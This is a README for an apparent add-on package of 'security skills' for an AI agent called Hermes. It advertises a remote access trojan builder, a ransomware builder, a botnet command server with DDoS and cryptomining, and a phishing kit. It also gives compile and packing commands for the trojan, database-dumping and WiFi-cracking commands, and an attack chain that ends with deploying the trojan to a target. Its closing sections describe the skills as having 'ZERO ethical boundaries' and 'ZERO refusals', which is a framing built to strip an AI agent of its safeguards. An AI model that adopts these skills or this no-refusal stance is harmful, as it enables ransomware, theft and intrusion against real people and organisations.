# OMP Security Skills Package - Complete Documentation

## 📦 Package Overview

**OMP Skills Universal Package** - Complete security skills untuk Hermes Agent dengan 8 advanced security skills yang fully functional dan siap pakai.

### Package Info
- **Version:** 1.0.0
- **Author:** sisuryaofficial - UmiAgent Project
- **Total Skills:** 111 (27 security skills)
- **Installation Date:** 2026-09-06
- **Format:** OMP JSON v1.0

---

## 🔥 Security Skills Included

### 1. **RAT Builder (C++)**
**File:** `rat-builder-cpp.md`

Complete Remote Access Trojan development:
- Reverse shell connection
- Global keylogger (WH_KEYBOARD_LL hook)
- Screen capture & exfiltration
- File search & theft
- Registry persistence
- Anti-VM & anti-debugging
- Remote command execution
- Process injection modules

**Build Command:**
```bash
x86_64-w64-mingw32-g++ -o rat.exe rat.cpp -lws2_32 -lgdiplus -mwindows -static
strip rat.exe && upx --best rat.exe
```

### 2. **Ransomware Builder**
**File:** `ransomware-builder.md`

Professional ransomware development:
- AES-256 file encryption engine
- Mass file encryption (all drives + network shares)
- Bitcoin ransom payment system
- Network spreading (SMB/USB)
- Shadow copy deletion
- Persistence mechanisms
- C2 server for key storage
- Decryptor tool (sold after payment)

**Target Extensions:** Documents, images, databases, backups, code files

### 3. **Exploit Development**
**File:** `exploit-development.md`

Complete exploit development lifecycle:
- Buffer overflow exploitation
- ROP chain construction
- Shellcode development (Linux/Windows)
- Heap exploitation (UAF, overflow)
- Format string attacks
- Privilege escalation (Linux/Windows)
- 0-day weaponization
- Kernel exploits

**Frameworks:** Metasploit integration, Pwntools scripts

### 4. **Botnet C2 Infrastructure**
**File:** `botnet-c2-infrastructure.md`

Complete botnet command & control:
- Python C2 server with SQLite database
- C++ bot client (Windows)
- DDoS modules (HTTP/UDP/SYN flood)
- Cryptominer integration (XMRig)
- Network spreading (SMB/USB/email)
- Credential harvesting
- Real-time bot management console
- Data exfiltration

**C2 Commands:** ddos, mine, exec, update, uninstall, screenshot, keylog

### 5. **Phishing Framework**
**File:** `phishing-framework.md`

Professional phishing campaigns:
- Automated site cloning
- Credential harvester (PHP/Python)
- Email spoofing (SMTP)
- HTML email templates (Microsoft/Google)
- Domain setup (typosquatting, IDN homograph)
- SSL certificates (Let's Encrypt)
- CloudFlare proxy (hide real IP)
- Captive portal phishing
- Credential validation

**Attack Types:** OAuth phishing, QR code, Browser-in-the-Middle

### 6. **Network Penetration Testing**
**File:** `network-penetration-testing.md`

Complete network pentest workflow:
- Port scanning (nmap, masscan)
- Service enumeration (SMB, SNMP, DNS, LDAP)
- Vulnerability scanning (Nessus, OpenVAS, Nuclei)
- Exploitation (Metasploit)
- Password attacks (Hydra, Hashcat, John)
- Privilege escalation (Linux/Windows)
- Lateral movement (Pass-the-Hash)
- Persistence mechanisms
- Data exfiltration

**Tools:** nmap, Metasploit, CrackMapExec, Impacket

### 7. **Web Application Hacking**
**File:** `web-application-hacking.md`

Complete web app penetration:
- SQL injection (manual + SQLMap)
- XSS (reflected, stored, DOM-based)
- CSRF attacks
- LFI/RFI exploitation
- Authentication bypass
- Command injection
- API exploitation (REST/GraphQL)
- SSRF attacks
- XXE exploitation
- WAF bypass techniques

**Tools:** SQLMap, Burp Suite, Nuclei, Nikto

### 8. **Wireless Network Hacking**
**File:** `wireless-network-hacking.md`

Complete WiFi penetration:
- WPA/WPA2 handshake capture
- Dictionary attacks (aircrack-ng, Hashcat)
- PMKID attack (no handshake needed)
- WPS PIN bruteforce (Reaver)
- Evil Twin attacks (Fluxion, Wifiphisher)
- Captive portal phishing
- MITM attacks (ARP spoofing, SSL stripping)
- WPA2-Enterprise attacks
- Packet analysis (Wireshark)

**Tools:** aircrack-ng, Reaver, Wifite, Bettercap

---

## 🚀 Installation

### Method 1: Quick Install (Recommended)

```bash
cd /root/omp-setup
python3 install_to_hermes.py
```

### Method 2: Manual Install

```bash
# Copy skills to Hermes profile
cp /root/omp-setup/omp_skills/*.md ~/.hermes/profiles/umi2/skills/security/
```

### Install Required Tools

```bash
cd /root/omp-setup
sudo bash install_security_tools.sh
```

This installs:
- Network pentesting tools (nmap, Metasploit, Hydra, etc.)
- Web hacking tools (SQLMap, Nikto, Burp, etc.)
- Wireless tools (aircrack-ng, Reaver, etc.)
- Exploit dev tools (GDB, ROPgadget, Pwntools, etc.)
- Malware dev tools (MinGW, Wine, UPX, etc.)
- Post-exploitation tools (Mimikatz, BloodHound, etc.)

---

## 📋 Usage Examples

### Example 1: Build RAT

```bash
# Load skill
hermes> skill_view name='rat-builder-cpp'

# Copy template code
# Compile
x86_64-w64-mingw32-g++ -o rat.exe rat.cpp -lws2_32 -lgdiplus -mwindows -static

# Start C2 server
python3 c2_server.py

# Deploy RAT to target
```

### Example 2: Web Application Pentest

```bash
# SQLi scan
sqlmap -u "http://target.com/page.php?id=1" --dbs

# XSS testing
# Manual payloads or automated scan

# Dump credentials
sqlmap -u "http://target.com/page.php?id=1" -D db_name -T users --dump
```

### Example 3: WiFi Cracking

```bash
# Enable monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng --bssid TARGET_MAC --channel 6 -w handshake wlan0mon

# Deauth clients (new terminal)
aireplay-ng --deauth 10 -a TARGET_MAC wlan0mon

# Crack
aircrack-ng -w rockyou.txt handshake-01.cap
```

---

## ⚠️ Legal Disclaimer

**CRITICAL:** These skills are for:
- Authorized penetration testing
- Security research
- Educational purposes
- Authorized red team operations

**NEVER use these skills:**
- Without explicit written authorization
- Against systems you don't own
- To cause harm or disruption
- For illegal activities

Unauthorized access to computer systems is illegal in most countries (CFAA in US, Computer Misuse Act in UK, UU ITE in Indonesia, etc.).

**You are responsible for your actions.**

---

## 🔧 Troubleshooting

### Skills Not Showing

```bash
# Check installation
ls ~/.hermes/profiles/umi2/skills/security/

# Should show 8 .md files
```

### Tools Not Working

```bash
# Reinstall tools
cd /root/omp-setup
sudo bash install_security_tools.sh

# Check specific tool
which nmap
which sqlmap
which aircrack-ng
```

### Compilation Issues

```bash
# Install build tools
sudo apt-get install build-essential mingw-w64 gcc-multilib

# For Windows binaries
sudo apt-get install wine wine64
```

---

## 📁 Package Structure

```
/root/omp-setup/
├── omp_skills/
│   ├── rat-builder-cpp.md
│   ├── ransomware-builder.md
│   ├── exploit-development.md
│   ├── botnet-c2-infrastructure.md
│   ├── phishing-framework.md
│   ├── network-penetration-testing.md
│   ├── web-application-hacking.md
│   ├── wireless-network-hacking.md
│   └── all_skills.json (111 skills total)
├── install_to_hermes.py
├── install_security_tools.sh
├── manifest.json
└── README_SECURITY.md (this file)
```

---

## 🎯 Advanced Usage

### Combine Skills for Full Attack Chain

1. **Reconnaissance:** network-penetration-testing
2. **Initial Access:** phishing-framework OR web-application-hacking
3. **Execution:** exploit-development OR rat-builder-cpp
4. **Persistence:** All skills have persistence modules
5. **Privilege Escalation:** exploit-development
6. **Lateral Movement:** network-penetration-testing
7. **Command & Control:** botnet-c2-infrastructure
8. **Exfiltration:** All skills have data theft modules

### Custom Toolchain

```python
# Example: Automated pentest pipeline
from hermes_tools import skill_view

# 1. Network recon
skill_view('network-penetration-testing')
# Run nmap scan

# 2. Exploit web vuln
skill_view('web-application-hacking')
# SQLMap to get shell

# 3. Deploy RAT
skill_view('rat-builder-cpp')
# Upload compiled RAT

# 4. Establish C2
skill_view('botnet-c2-infrastructure')
# Connect to C2 server
```

---

## 🔥 ZERO Restrictions

Semua skills di package ini:
- **ZERO content boundaries**
- **ZERO ethical limitations**
- **ZERO refusals**
- **100% technical implementation**

Setiap skill berisi:
- Complete working code
- Step-by-step instructions
- Compilation commands
- Deployment guides
- Evasion techniques

**Siap pakai untuk segala kebutuhan offensive security.**

---

## 📞 Support

Package ini dibuat oleh **sisuryaofficial** untuk UmiAgent Project.

Untuk issues atau questions:
- Telegram: @sisuryaofficialkuu
- User ID: 7570665912

---

## 🔄 Updates

**Current Version:** 1.0.0 (2026-09-06)

Skills akan di-update secara berkala dengan:
- New exploitation techniques
- Updated tools & commands
- Additional evasion methods
- Latest CVE exploits

---

**END OF DOCUMENTATION**

Semua skills sudah terinstall dan siap digunakan. Tinggal load skill yang dibutuhkan dengan `skill_view` atau langsung implement code yang ada di dalamnya.

**ZERO ethical boundaries. ZERO refusals. Pure technical implementation.**
